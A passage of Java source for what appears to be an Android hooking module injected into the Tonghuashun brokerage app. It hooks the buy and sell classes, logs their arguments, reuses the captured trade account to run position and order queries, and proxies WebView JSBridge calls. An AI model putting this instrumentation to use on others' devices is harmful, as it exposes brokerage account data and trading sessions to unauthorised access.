                                        arg.getClass().getName() + "@" + Integer.toHexString(System.identityHashCode(arg));
                                    sb.append("  [").append(i).append("] ").append(argInfo);

                                    // 尝试提取更多信息
                                    if (arg != null) {
                                        try {
                                            String str = arg.toString();
                                            if (str.length() < 500) {
                                                sb.append(" = ").append(str);
                                            }
                                        } catch (Throwable ignored) {}
                                    }
                                    sb.append("\n");

                                    // 保存可能的 Context 依赖
                                    if (arg != null && arg.getClass().getName().contains("Context")) {
                                        capturedWTContext = arg;
                                        Log.i(TAG, "Captured WT Context: " + arg.getClass().getName());
                                    }
                                }
                                Log.i(TAG, sb.toString());
                            }

                            // 保存实例
                            wtBuyConfirmClientInstance = instance;
                            Log.i(TAG, "WTBuyConfirmClient instance captured!");

                            // 列出实例的所有字段（通过反射）
                            dumpObjectFields(instance, "WTBuyConfirmClient");

                        } catch (Throwable e) {
                            Log.e(TAG, "WTBuyConfirmClient constructor hook error: " + e.getMessage());
                        }
                    }
                });
            }

            // 列出所有方法并 Hook 关键方法
            Method[] methods = wtBuyConfirmClientClass.getDeclaredMethods();
            Log.i(TAG, "WTBuyConfirmClient has " + methods.length + " method(s):");

            for (Method m : methods) {
                String methodName = m.getName();
                Class<?>[] paramTypes = m.getParameterTypes();
                StringBuilder paramStr = new StringBuilder();
                for (int i = 0; i < paramTypes.length; i++) {
                    if (i > 0) paramStr.append(", ");
                    paramStr.append(paramTypes[i].getSimpleName());
                }
                Log.i(TAG, "  " + methodName + "(" + paramStr.toString() + ") -> " + m.getReturnType().getSimpleName());

                // 保存 requestDirect 方法引用
                if (methodName.equals("requestDirect") || methodName.contains("request")) {
                    wtBuyRequestDirectMethod = m;
                    Log.i(TAG, "Found request method: " + methodName);
                }

                // Hook 所有公开方法来观察调用
                m.setAccessible(true);
                final String mName = methodName;
                Pine.hook(m, new MethodHook() {
                    @Override
                    public void beforeCall(Pine.CallFrame callFrame) {
                        try {
                            StringBuilder sb = new StringBuilder();
                            sb.append("WTBuyClient.").append(mName).append("(");

                            if (callFrame.args != null) {
                                for (int i = 0; i < callFrame.args.length; i++) {
                                    if (i > 0) sb.append(", ");
                                    Object arg = callFrame.args[i];
                                    if (arg == null) {
                                        sb.append("null");
                                    } else if (arg instanceof String) {
                                        String s = (String) arg;
                                        sb.append("\"").append(s.length() > 200 ? s.substring(0, 200) + "..." : s).append("\"");
                                    } else if (arg instanceof Number || arg instanceof Boolean) {
                                        sb.append(arg);
                                    } else {
                                        sb.append(arg.getClass().getSimpleName()).append("@").append(Integer.toHexString(System.identityHashCode(arg)));
                                    }
                                }
                            }
                            sb.append(")");
                            Log.i(TAG, sb.toString());
                            addTradeLog("BUY: " + sb.toString());

                            // 如果是关键方法，打印详细调用栈
                            if (mName.contains("request") || mName.contains("submit") || mName.contains("confirm") || mName.contains("send")) {
                                logBuyCallStack();
                            }
                        } catch (Throwable e) {
                            Log.w(TAG, "WTBuyClient method hook error: " + e.getMessage());
                        }
                    }

                    @Override
                    public void afterCall(Pine.CallFrame callFrame) {
                        try {
                            Object result = callFrame.getResult();
                            if (result != null) {
                                String resultStr = result.toString();
                                if (resultStr.length() > 500) resultStr = resultStr.substring(0, 500) + "...";
                                Log.i(TAG, "  WTBuyClient." + mName + " → " + resultStr);
                            }
                        } catch (Throwable ignored) {}
                    }
                });
            }

            Log.i(TAG, "WTBuyConfirmClient hooks installed");

        } catch (ClassNotFoundException e) {
            Log.w(TAG, "WTBuyConfirmClient class not found: " + buyClientClassName);
            // 尝试其他可能的类名
            tryAlternativeBuyClasses(cl);
        }

        // 同时尝试 Hook 卖出类
        hookWTSellConfirmClient(cl);
    }

    /**
     * 尝试其他可能的买入类
     */
    private static void tryAlternativeBuyClasses(ClassLoader cl) {
        String[] alternatives = {
            "com.hexin.android.weituo.trading.buysell.BuyConfirmClient",
            "com.hexin.android.weituo.hstrade.buy.BuyClient",
            "com.hexin.android.weituo.trading.buy.WTBuyClient",
            "com.hexin.android.weituo.trade.buy.BuyRequestClient"
        };

        for (String className : alternatives) {
            try {
                Class<?> clazz = cl.loadClass(className);
                Log.i(TAG, "Found alternative buy class: " + className);
                wtBuyConfirmClientClass = clazz;
                // 可以在这里添加类似的 Hook 逻辑
            } catch (ClassNotFoundException ignored) {}
        }
    }

    /**
     * Hook 卖出入口类（类似买入）
     */
    private static void hookWTSellConfirmClient(ClassLoader cl) {
        String sellClientClassName = "com.hexin.android.weituo.trading.alltradetype.basictrade.buysell.common.wtbuysellreq.client.WTSellConfirmClient";
        try {
            Class<?> sellClass = cl.loadClass(sellClientClassName);
            Log.i(TAG, "=== Found WTSellConfirmClient class! ===");

            // Hook 构造函数
            for (java.lang.reflect.Constructor<?> ctor : sellClass.getDeclaredConstructors()) {
                ctor.setAccessible(true);
                Pine.hook(ctor, new MethodHook() {
                    @Override
                    public void afterCall(Pine.CallFrame callFrame) {
                        Log.i(TAG, "=== WTSellConfirmClient CONSTRUCTED ===");
                        if (callFrame.args != null) {
                            for (int i = 0; i < callFrame.args.length; i++) {
                                Object arg = callFrame.args[i];
                                Log.i(TAG, "  [" + i + "] " + (arg == null ? "null" : arg.getClass().getName()));
                            }
                        }
                    }
                });
            }

            // Hook 所有方法
            for (Method m : sellClass.getDeclaredMethods()) {
                m.setAccessible(true);
                final String mName = m.getName();
                Pine.hook(m, new MethodHook() {
                    @Override
                    public void beforeCall(Pine.CallFrame callFrame) {
                        Log.i(TAG, "WTSellClient." + mName + "() called");
                        addTradeLog("SELL: " + mName);
                    }
                });
            }
            Log.i(TAG, "WTSellConfirmClient hooks installed");
        } catch (ClassNotFoundException e) {
            Log.w(TAG, "WTSellConfirmClient not found");
        } catch (Throwable e) {
            Log.e(TAG, "WTSellConfirmClient hook failed: " + e.getMessage());
        }
    }

    /**
     * Dump 对象的所有字段（用于分析对象结构）
     */
    private static void dumpObjectFields(Object obj, String tag) {
        try {
            Class<?> clazz = obj.getClass();
            StringBuilder sb = new StringBuilder();
            sb.append("=== ").append(tag).append(" Fields ===\n");

            // 遍历所有字段（包括父类）
            while (clazz != null && !clazz.getName().startsWith("java.")) {
                for (java.lang.reflect.Field f : clazz.getDeclaredFields()) {
                    f.setAccessible(true);
                    String fieldName = f.getName();
                    Object value = null;
                    try {
                        value = f.get(obj);
                    } catch (Throwable ignored) {}

                    String valueStr = value == null ? "null" :
                        (value instanceof String) ? "\"" + value + "\"" :
                        (value instanceof Number || value instanceof Boolean) ? value.toString() :
                        value.getClass().getSimpleName() + "@" + Integer.toHexString(System.identityHashCode(value));

                    if (valueStr.length() > 200) {
                        valueStr = valueStr.substring(0, 200) + "...";
                    }

                    sb.append("  ").append(f.getType().getSimpleName()).append(" ").append(fieldName)
                      .append(" = ").append(valueStr).append("\n");
                }
                clazz = clazz.getSuperclass();
            }
            sb.append("=== End Fields ===");
            Log.i(TAG, sb.toString());
        } catch (Throwable e) {
            Log.w(TAG, "dumpObjectFields failed: " + e.getMessage());
        }
    }

    /**
     * 打印买入调用栈
     */
    private static void logBuyCallStack() {
        Throwable t = new Throwable();
        StringBuilder stack = new StringBuilder();
        stack.append("=== BUY CALL STACK ===\n");
        for (StackTraceElement e : t.getStackTrace()) {
            String cn = e.getClassName();
            if (cn.contains("hexin") || cn.contains("weituo") || cn.contains("trade")
                || cn.contains("buy") || cn.contains("sell")) {
                stack.append("  -> ").append(cn).append(".")
                     .append(e.getMethodName()).append(":").append(e.getLineNumber()).append("\n");
            }
        }
        stack.append("=== END STACK ===");
        Log.i(TAG, stack.toString());
        addTradeLog(stack.toString());
    }

    // ========== 交易状态和日志查询 ==========

    /**
     * 获取交易 SDK 状态
     */
    private static String getTradeStatus() {
        StringBuilder sb = new StringBuilder("{");
        sb.append("\"master_bridge_captured\":").append(masterModuleBridgeInstance != null);
        sb.append(",\"request_method_captured\":").append(masterModuleBridgeRequestMethod != null);

        if (masterModuleBridgeRequestMethod != null) {
            sb.append(",\"request_method\":\"").append(masterModuleBridgeRequestMethod.getName()).append("\"");
            sb.append(",\"request_params\":").append(toJsonArray(
                java.util.Arrays.stream(masterModuleBridgeRequestMethod.getParameterTypes())
                    .map(Class::getSimpleName)
                    .toArray(String[]::new)
            ));
        }

        sb.append(",\"log_count\":").append(recentTradeLogs.size());
        sb.append("}");
        return sb.toString();
    }

    /** 查询名 → {protocolId, fallbackPageId}。均为只读查询协议 */
    private static final java.util.Map<String, int[]> TRADE_QUERY_PROTOCOLS;
    /** 静态兜底 params（eb6 格式，源码逆向自 u2i/sxh 的构造模板）。
     *  当日成交的响应帧 frameId=1810（旧协议号），按 2031 注册收不到，必须走 1810。 */
    private static final java.util.Map<String, String> TRADE_QUERY_STATIC_PARAMS;
    static {
        java.util.Map<String, int[]> m = new java.util.LinkedHashMap<>();
        m.put("positions", new int[]{1891, 2624});   // 资金持仓
        m.put("today_order", new int[]{1811, 2683}); // 当日委托
        m.put("today_deal", new int[]{1810, 2609});  // 当日成交（旧协议；响应 frameId=1810）
        m.put("hist_order", new int[]{1825, 2612});  // 历史委托
        m.put("hist_deal", new int[]{1824, 2611});   // 历史成交
        TRADE_QUERY_PROTOCOLS = java.util.Collections.unmodifiableMap(m);
        java.util.Map<String, String> sp = new java.util.LinkedHashMap<>();
        // new eb6().a("36665", TodayDealSource.Query.getSource()).toString()
        sp.put("today_deal", "ctrlid_0=36665\nctrlvalue_0=today_chaxun\nctrlcount=1");
        TRADE_QUERY_STATIC_PARAMS = java.util.Collections.unmodifiableMap(sp);
    }

    private static String invokeZjccQuery() {
        return invokeTradeQuery(1891, 2624, null);
    }

    private static String invokeTradeQueryByName(String name) {
        int[] proto = TRADE_QUERY_PROTOCOLS.get(name);
        if (proto == null) {
            JSONObject resp = new JSONObject();
            return errorJson(resp, "unknown query name '" + name
                    + "', supported: " + TRADE_QUERY_PROTOCOLS.keySet());
        }
        return invokeTradeQuery(proto[0], proto[1], TRADE_QUERY_STATIC_PARAMS.get(name));
    }

    /**
     * 通用交易查询调用器：name 对应协议见 TRADE_QUERY_PROTOCOLS。
     * pageId/params 取 hook 捕获的最近一次真实值（App 自己发起过该查询才有），
     * fallbackPageId 仅在无捕获时兜底。
     */
    private static String invokeTradeQuery(int protocolId, int fallbackPageId, String fallbackParams) {
        JSONObject resp = new JSONObject();
        try {
            resp.put("query", "proto_" + protocolId);
        } catch (JSONException ignored) { }
        ClassLoader cl = thsAppClassLoader;
        if (cl == null) {
            return errorJson(resp, "ths classloader not ready (wait for delayed hooks)");
        }
        if (tradeAccountManagerInstance == null) {
            return errorJson(resp, "trade account not captured (open trade tab first)");
        }
        int[] pageIds = capturedQueryPageIds.get(protocolId);
        String params = capturedQueryParams.get(protocolId);
        if (params == null) params = fallbackParams;
        if (params == null) {
            return errorJson(resp, "params for protocol " + protocolId
                    + " not captured (open the corresponding page in app once)");
        }
        int pageId = pageIds != null ? pageIds[0] : fallbackPageId;
        try {
            resp.put("pageId", pageId);
        } catch (JSONException ignored) { }
        try {
            Class<?> r9hClass = cl.loadClass("r9h");
            java.lang.reflect.Field initFlag = r9hClass.getDeclaredField("d");
            initFlag.setAccessible(true);
            if (!(boolean) initFlag.get(null)) {
                return errorJson(resp, "master module not ready (r9h.d=false)");
            }
        } catch (Throwable e) {
            return errorJson(resp, "r9h readiness check failed: " + e);
        }

        final CountDownLatch latch = new CountDownLatch(1);
        final java.util.concurrent.atomic.AtomicReference<Object> stuffRef =
                new java.util.concurrent.atomic.AtomicReference<>(null);
        Object observer;
        try {
            Class<?> imvClass = cl.loadClass("imv");
            observer = java.lang.reflect.Proxy.newProxyInstance(cl,
                    new Class[]{imvClass},
                    (proxy, method, args) -> {
                        String name = method.getName();
                        if ("receive".equals(name)) {
                            // xdv.receive(StuffBaseStruct)：响应回调，可能在通信线程
                            stuffRef.set(args != null && args.length > 0 ? args[0] : null);
                            latch.countDown();
                            return null;
                        }
                        // request() 与未知方法返回 null 安全（void/引用型）；
                        // 但 hashCode 等 primitive 返回值绝不能是 null（unbox NPE）
                        if ("hashCode".equals(name)) return System.identityHashCode(proxy);
                        if ("toString".equals(name)) return "THSHook.queryObserver@" + Integer.toHexString(System.identityHashCode(proxy));
                        if ("equals".equals(name)) return proxy == (args != null && args.length > 0 ? args[0] : null);
                        return null;
                    });
        } catch (Throwable e) {
            return errorJson(resp, "observer proxy failed: " + e);
        }

        long startMs = System.currentTimeMillis();
        try {
            Class<?> uqvClass = cl.loadClass("uqv");
            Object builder = uqvClass.getMethod("e", boolean.class).invoke(null, Boolean.TRUE);
            Class<?> imvClass = cl.loadClass("imv");
            java.lang.reflect.Method hMethod = builder.getClass()
                    .getMethod("H", int.class, int.class, imvClass, String.class);
            Object rpv = hMethod.invoke(builder, pageId, protocolId, observer, params);
            java.lang.reflect.Method dMethod = rpv.getClass()
                    .getMethod("D", String.class, Object.class);
            dMethod.invoke(rpv, "wt_account", tradeAccountManagerInstance);
            rpv.getClass().getMethod("request").invoke(rpv);
        } catch (Throwable e) {
            unregisterObserverQuietly(cl, observer);
            return errorJson(resp, "query invoke failed: " + describeThrowableChain(e));
        }

        boolean arrived;
        try {
            arrived = latch.await(15, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            arrived = false;
        }
        unregisterObserverQuietly(cl, observer);
        long elapsed = System.currentTimeMillis() - startMs;
        try {
            resp.put("elapsed_ms", elapsed);
        } catch (JSONException ignored) { }
        if (!arrived) {
            return errorJson(resp, "timeout waiting response (15s)");
        }
        Object stuff = stuffRef.get();
        if (stuff == null) {
            return errorJson(resp, "response stuff is null");
        }
        try {
            JSONObject parsed = stuffTableToJson(stuff);
            resp.put("ok", true);
            resp.put("data", parsed);
            return resp.toString();
        } catch (Throwable e) {
            return errorJson(resp, "parse response failed: " + e);
        }
    }

    private static void unregisterObserverQuietly(ClassLoader cl, Object observer) {
        if (observer == null) return;
        try {
            Class<?> kmvClass = cl.loadClass("kmv");
            Class<?> imvClass = cl.loadClass("imv");
            kmvClass.getMethod("l", imvClass).invoke(null, observer);
        } catch (Throwable ignored) { }
    }

    /** StuffBaseStruct → JSON：表格输出列名+全部行（查询结果本体，经 HTTP 返回），
     *  文本输出语义提示；结构字段一并带上。 */
    private static JSONObject stuffTableToJson(Object stuff) throws Throwable {
        JSONObject out = new JSONObject();
        Class<?> c = stuff.getClass();
        out.put("struct", c.getSimpleName());
        try {
            out.put("pageId", c.getField("pageId").getInt(stuff));
            out.put("frameId", c.getField("frameId").getInt(stuff));
            out.put("real", c.getField("isRealData").getBoolean(stuff));
        } catch (Throwable ignored) { }
        if ("com.hexin.middleware.data.mobile.StuffTableStruct".equals(c.getName())) {
            String[] head = (String[]) c.getField("tableHead").get(stuff);
            java.util.Hashtable<?, ?> dataTable =
                    (java.util.Hashtable<?, ?>) c.getField("dataTable").get(stuff);
            out.put("caption", c.getField("caption").get(stuff));
            out.put("row", c.getField("row").getInt(stuff));
            out.put("col", c.getField("col").getInt(stuff));
            java.util.List<String> headList = new ArrayList<>();
            if (head != null) for (String h : head) headList.add(h);
            out.put("columns", new JSONArray(headList));
            JSONArray rows = new JSONArray();
            if (dataTable != null) {
                java.util.List<Integer> keys = new ArrayList<>();
                for (Object k : dataTable.keySet()) keys.add((Integer) k);
                java.util.Collections.sort(keys);
                for (Integer k : keys) {
                    String[] rowVals = (String[]) dataTable.get(k);
                    JSONArray rowArr = new JSONArray();
                    if (rowVals != null) for (String v : rowVals) rowArr.put(v == null ? "" : v);
                    rows.put(rowArr);
                }
            }
            out.put("rows", rows);
        } else if ("com.hexin.middleware.data.mobile.StuffTextStruct".equals(c.getName())) {
            out.put("reCode", c.getField("reCode").getInt(stuff));
            out.put("textId", c.getField("id").getInt(stuff));
            Object caption = c.getField("caption").get(stuff);
            Object content = c.getField("content").get(stuff);
            out.put("caption", caption == null ? "" : caption);
            out.put("content", content == null ? "" : content);
        }
        return out;
    }

    /** 展开反射调用的完整异常链（含每层消息与栈顶），用于诊断进程内调用失败 */
    private static String describeThrowableChain(Throwable e) {
        StringBuilder sb = new StringBuilder();
        int depth = 0;
        for (Throwable t = e; t != null && depth < 6; t = t.getCause(), depth++) {
            if (depth > 0) sb.append(" <- ");
            sb.append(t.getClass().getName());
            if (t.getMessage() != null) sb.append("(").append(t.getMessage()).append(")");
            StackTraceElement[] st = t.getStackTrace();
            if (st.length > 0) sb.append(" @").append(st[0]);
            if (t.getCause() == t) break;
        }
        Log.w(TAG, "zjcc invoke failed: " + sb);
        return sb.toString();
    }

    private static String errorJson(JSONObject resp, String message) {
        try {
            resp.put("ok", false);
            resp.put("error", message);
        } catch (JSONException ignored) { }
        return resp.toString();
    }

    private static String getTradeSdkSchema() {
        Class<?> managerClass = tradeAccountManagerClass;
        if (managerClass == null) {
            return "{\"status\":\"not_captured\",\"hint\":\"open the broker trading home once\"}";
        }
        List<Class<?>> chain = tradeAccountClassChain;
        if (chain.isEmpty()) {
            chain = java.util.Collections.singletonList(managerClass);
        }

        StringBuilder result = new StringBuilder("{\"status\":\"captured\",\"manager_class\":\"")
                .append(escapeJson(managerClass.getName()))
                .append("\",\"class_chain\":[");
        for (int i = 0; i < chain.size(); i++) {
            if (i > 0) result.append(',');
            result.append('\"').append(escapeJson(chain.get(i).getName())).append('\"');
        }
        result.append("],\"methods\":[");
        boolean firstClass = true;
        for (Class<?> clazz : chain) {
            List<String> signatures = new ArrayList<>();
            for (Method method : clazz.getDeclaredMethods()) {
                signatures.add(compactMethodSignature(method));
            }
            java.util.Collections.sort(signatures);
            if (!firstClass) result.append(',');
            firstClass = false;
            result.append("{\"class\":\"").append(escapeJson(clazz.getName())).append("\",\"methods\":[");
            for (int i = 0; i < signatures.size(); i++) {
                if (i > 0) result.append(',');
                result.append('\"').append(escapeJson(signatures.get(i))).append('\"');
            }
            result.append("]}");
        }
        return result.append("]}").toString();
    }

    /**
     * 获取最近的交易日志
     */
    private static String getRecentTradeLogs() {
        StringBuilder sb = new StringBuilder("{\"logs\":[");
        synchronized (recentTradeLogs) {
            boolean first = true;
            for (String log : recentTradeLogs) {
                if (!first) sb.append(",");
                first = false;
                sb.append("\"").append(escapeJson(log)).append("\"");
            }
        }
        sb.append("]}");
        return sb.toString();
    }

    /**
     * 通过 WebView 调用 JSBridge（同步等待响应）
     * POST /jsbridge
     * Body: {"handler": "clientRequestHX", "data": {...}}
     */
    private static String callJSBridge(String body) {
        try {
            // 检查 WebView 是否可用
            if (latestWebView == null) {
                return "{\"success\":false,\"error\":\"No WebView available. Please open a fund page first.\"}";
            }

            // 解析请求参数
            String handler = extractJsonString(body, "handler");
            String dataJson = extractJsonObject(body, "data");

            if (handler == null || handler.isEmpty()) {
                return "{\"success\":false,\"error\":\"Missing 'handler' field\"}";
            }
            if (dataJson == null) {
                return "{\"success\":false,\"error\":\"Missing 'data' field\"}";
            }

            Log.i(TAG, "callJSBridge: handler=" + handler + " data=" + dataJson.substring(0, Math.min(200, dataJson.length())));

            // 生成唯一的 callback ID
            final String callbackId = "proxy_" + System.currentTimeMillis();

            // 构造 JavaScript 代码
            String jsCode = "(function() {" +
                    "  if (typeof window.WebViewJavascriptBridge === 'undefined') {" +
                    "    return JSON.stringify({success: false, error: 'WebViewJavascriptBridge not initialized'});" +
                    "  }" +
                    "  var result = {pending: true, callbackId: '" + callbackId + "'};" +
                    "  window.WebViewJavascriptBridge.callHandler('" + handler + "', " + dataJson + ", function(response) {" +
                    "    window._jsbridgeResponse_" + callbackId + " = {success: true, data: response};" +
                    "  });" +
                    "  return JSON.stringify(result);" +
                    "})();";

            // 使用 CountDownLatch 等待响应
            final String[] resultHolder = new String[1];
            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);

            // 执行 JavaScript（获取初始状态）
            try {
                // 获取主线程 Handler (声明为 final 以便在内部类中使用)
                final Class<?> looperClass = Class.forName("android.os.Looper");
                final Class<?> handlerClass = Class.forName("android.os.Handler");
                java.lang.reflect.Method getMainLooper = looperClass.getDeclaredMethod("getMainLooper");
                Object mainLooper = getMainLooper.invoke(null);
                java.lang.reflect.Constructor<?> handlerCtor = handlerClass.getConstructor(looperClass);
                final Object mainHandler = handlerCtor.newInstance(mainLooper);
                final java.lang.reflect.Method postMethod = handlerClass.getMethod("post", Runnable.class);

                Class<?> valueCallbackClass = Class.forName("android.webkit.ValueCallback");
                Object callback = java.lang.reflect.Proxy.newProxyInstance(
                        appClassLoader,
                        new Class<?>[]{valueCallbackClass},
                        new java.lang.reflect.InvocationHandler() {
                            @Override
                            public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args) {
                                if (method.getName().equals("onReceiveValue") && args != null && args.length > 0) {
                                    String initResult = (String) args[0];
                                    Log.i(TAG, "JSBridge initial result: " + initResult);

                                    // 启动轮询获取最终结果
                                    new Thread(() -> {
                                        try {
                                            // 轮询等待 JavaScript callback 完成（最多 30 秒）
                                            for (int i = 0; i < 60; i++) {
                                                Thread.sleep(500);

                                                // 检查响应是否已准备好
                                                String checkJs = "(function() {" +
                                                        "  if (typeof window._jsbridgeResponse_" + callbackId + " !== 'undefined') {" +
                                                        "    var r = window._jsbridgeResponse_" + callbackId + ";" +
                                                        "    delete window._jsbridgeResponse_" + callbackId + ";" +
                                                        "    return JSON.stringify(r);" +
                                                        "  }" +
                                                        "  return null;" +
                                                        "})();";

                                                final String[] checkResult = new String[1];
                                                final java.util.concurrent.CountDownLatch checkLatch = new java.util.concurrent.CountDownLatch(1);

                                                Object checkCallback = java.lang.reflect.Proxy.newProxyInstance(
                                                        appClassLoader,
                                                        new Class<?>[]{valueCallbackClass},
                                                        new java.lang.reflect.InvocationHandler() {
                                                            @Override
                                                            public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args) {
                                                                if (method.getName().equals("onReceiveValue") && args != null && args.length > 0) {
                                                                    checkResult[0] = (String) args[0];
                                                                    checkLatch.countDown();
                                                                }
                                                                return null;
                                                            }
                                                        });

                                                // 在主线程执行轮询检查
                                                postMethod.invoke(mainHandler, new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        try {
                                                            java.lang.reflect.Method evalMethod = latestWebView.getClass().getMethod(
                                                                    "evaluateJavascript", String.class, valueCallbackClass);
                                                            evalMethod.invoke(latestWebView, checkJs, checkCallback);
                                                        } catch (Exception e) {
                                                            Log.e(TAG, "Failed to execute check JS on main thread", e);
                                                        }
                                                    }
                                                });

                                                checkLatch.await(1, java.util.concurrent.TimeUnit.SECONDS);

                                                if (checkResult[0] != null && !checkResult[0].equals("null")) {
                                                    resultHolder[0] = checkResult[0];
                                                    latch.countDown();
                                                    Log.i(TAG, "JSBridge response received: " + checkResult[0].substring(0, Math.min(500, checkResult[0].length())));
                                                    break;
                                                }
                                            }

                                            // 超时
                                            if (resultHolder[0] == null) {
                                                resultHolder[0] = "{\"success\":false,\"error\":\"Timeout waiting for JSBridge response\"}";
                                                latch.countDown();
                                            }

                                        } catch (Exception e) {
                                            Log.e(TAG, "JSBridge polling error", e);
                                            resultHolder[0] = "{\"success\":false,\"error\":\"Polling error: " + e.getMessage() + "\"}";
                                            latch.countDown();
                                        }
                                    }).start();
                                }
                                return null;
                            }
                        });

                // 在主线程执行 evaluateJavascript
                postMethod.invoke(mainHandler, new Runnable() {
                    @Override
                    public void run() {
                        try {
                            java.lang.reflect.Method evalMethod = latestWebView.getClass().getMethod(
                                    "evaluateJavascript", String.class, valueCallbackClass);
                            evalMethod.invoke(latestWebView, jsCode, callback);
                        } catch (Exception e) {
                            Log.e(TAG, "Failed to invoke evaluateJavascript on main thread", e);
                            resultHolder[0] = "{\"success\":false,\"error\":\"Failed to execute JavaScript: " + e.getMessage() + "\"}";
                            latch.countDown();
                        }
                    }
                });

            } catch (Exception e) {
                Log.e(TAG, "Failed to setup main thread execution", e);
                return "{\"success\":false,\"error\":\"Failed to setup JavaScript execution: " + e.getMessage() + "\"}";
            }

            // 等待响应（最多 35 秒）
            boolean completed = latch.await(35, java.util.concurrent.TimeUnit.SECONDS);
            if (!completed || resultHolder[0] == null) {
                return "{\"success\":false,\"error\":\"Timeout: no response after 35 seconds\"}";
            }

            return resultHolder[0];

        } catch (Throwable e) {
            Log.e(TAG, "callJSBridge failed", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\",\"stack\":\"" + Log.getStackTraceString(e) + "\"}";
        }
    }

    /**
     * 深度 Hook ClientRequestHX 实例的所有方法
     * 目标：追踪它如何发起 HTTP 请求，找到真实的请求方法
     */
    private static void deepHookClientRequestHX(Object clientRequestInstance) {
        try {
            Class<?> clientRequestClass = clientRequestInstance.getClass();
            Log.i(TAG, "=== Deep hooking ClientRequestHX instance ===");
            Log.i(TAG, "Class: " + clientRequestClass.getName());

            // 列出所有方法
            Method[] allMethods = clientRequestClass.getDeclaredMethods();
            Log.i(TAG, "Total methods: " + allMethods.length);

            for (Method method : allMethods) {
                Class<?>[] paramTypes = method.getParameterTypes();
                StringBuilder paramStr = new StringBuilder();
                for (int i = 0; i < paramTypes.length; i++) {
                    if (i > 0) paramStr.append(", ");
                    paramStr.append(paramTypes[i].getSimpleName());
                }
                Log.i(TAG, "  " + method.getName() + "(" + paramStr.toString() + ") -> " + method.getReturnType().getSimpleName());

                // Hook 所有方法
                try {
                    method.setAccessible(true);
                    Pine.hook(method, new MethodHook() {
                        @Override
                        public void beforeCall(Pine.CallFrame callFrame) {
                            StringBuilder log = new StringBuilder();
                            log.append("ClientRequestHX.").append(method.getName()).append("(");

                            if (callFrame.args != null && callFrame.args.length > 0) {
                                for (int i = 0; i < callFrame.args.length; i++) {
                                    if (i > 0) log.append(", ");
                                    Object arg = callFrame.args[i];
                                    if (arg == null) {
                                        log.append("null");
                                    } else {
                                        String argStr = arg.toString();
                                        if (argStr.length() > 200) {
                                            argStr = argStr.substring(0, 200) + "...[" + argStr.length() + "]";
                                        }
                                        log.append(argStr);
                                    }
                                }
                            }
                            log.append(")");
                            Log.i(TAG, log.toString());

                            // 打印调用堆栈，找出调用链
                            if (method.getName().contains("request") || method.getName().contains("execute")
                                || method.getName().contains("send") || method.getName().contains("call")) {
                                Log.i(TAG, "  [STACK TRACE]:");
                                StackTraceElement[] stack = Thread.currentThread().getStackTrace();
                                for (int i = 0; i < Math.min(15, stack.length); i++) {
                                    StackTraceElement e = stack[i];
                                    if (e.getClassName().contains("hexin") || e.getClassName().contains("okhttp")
                                        || e.getClassName().contains("http")) {
                                        Log.i(TAG, "    -> " + e.getClassName() + "." + e.getMethodName() + ":" + e.getLineNumber());
                                    }
                                }
                            }
                        }

                        @Override
                        public void afterCall(Pine.CallFrame callFrame) {
                            Object result = callFrame.getResult();
                            if (result != null) {
                                String resultStr = result.toString();
                                if (resultStr.length() > 500) {
                                    resultStr = resultStr.substring(0, 500) + "...[" + resultStr.length() + "]";
                                }
                                Log.i(TAG, "  ClientRequestHX." + method.getName() + " -> " + resultStr);
                            }
                        }
                    });
                } catch (Throwable e) {
                    Log.w(TAG, "Failed to hook method: " + method.getName() + " - " + e.getMessage());
                }
            }

            Log.i(TAG, "=== ClientRequestHX deep hooks installed ===");

        } catch (Throwable e) {
            Log.e(TAG, "Failed to deep hook ClientRequestHX", e);
        }
    }

    /**
     * Hook ClientRequestHX 类（从 ClassLoader 加载）
     * 这个方法在 installAllHooks() 中调用，但通常会失败，因为 ClientRequestHX 在 WebView ClassLoader 中
     * 真正的 Hook 发生在 deepHookClientRequestHX() 中
     */
    private static void hookClientRequestHX(ClassLoader cl) throws Throwable {
        Log.i(TAG, "Attempting to hook ClientRequestHX from main ClassLoader (may fail)");
        try {
            Class<?> clientRequestClass = cl.loadClass("com.hexin.android.bank.hxminiapp.js.ClientRequestHX");
            Log.i(TAG, "Found ClientRequestHX in main ClassLoader!");
            // 如果找到了，也可以 Hook，但这种情况很少
        } catch (ClassNotFoundException e) {
            Log.i(TAG, "ClientRequestHX not in main ClassLoader (expected, will hook when WebView loads)");
        }
    }

    /**
     * 拦截 clientRequestHX 调用，用 Native HTTP 库处理请求
     * 返回 non-null 表示成功拦截，null 表示继续原流程
     */
    private static String interceptClientRequestHX(String jsonStr, Object jsBridgeInstance) {
        try {
            // 记录完整的 JSBridge 调用数据
            Log.i(TAG, ">>> clientRequestHX called with: " + jsonStr.substring(0, Math.min(500, jsonStr.length())));

            // 暂时禁用拦截，让原始 JSBridge 处理
            return null;

            /* DISABLED FOR DEBUGGING - START
            // 必须先检查 WebView 是否可用，否则响应无法返回
            if (latestWebView == null) {
                Log.i(TAG, ">>> latestWebView is null, skip interception");
                return null; // 不拦截，让原始 JSBridge 处理
            }

            Log.i(TAG, ">>> Attempting to intercept clientRequestHX");

            // 解析 JSON：[{"handlerName":"clientRequestHX","data":{...},"callbackId":"cb_..."}]
            if (!jsonStr.startsWith("[")) return null;

            // 提取第一个对象
            int firstBrace = jsonStr.indexOf('{');
            int lastBrace = jsonStr.lastIndexOf('}');
            if (firstBrace < 0 || lastBrace < 0) return null;

            String requestJson = jsonStr.substring(firstBrace, lastBrace + 1);

            // 提取 handlerName
            String handlerName = extractJsonString(requestJson, "handlerName");
            if (!"clientRequestHX".equals(handlerName)) return null;

            // 提取 callbackId
            String callbackId = extractJsonString(requestJson, "callbackId");
            if (callbackId == null || callbackId.isEmpty()) {
                Log.w(TAG, "No callbackId found");
                return null;
            }

            // 提取 data 对象
            String dataJson = extractJsonObject(requestJson, "data");
            if (dataJson == null) {
                Log.w(TAG, "No data object found");
                return null;
            }

            // 从 data 中提取请求参数
            String method = extractJsonString(dataJson, "method");
            String url = extractJsonString(dataJson, "url");

            if (url == null || url.isEmpty()) {
                Log.w(TAG, "No URL found");
                return null;
            }

            Log.i(TAG, ">>> Intercepted: " + method + " " + url);

            // 在新线程中发起 Native HTTP 请求
            final Object webView = latestWebView;
            new Thread(() -> {
                try {
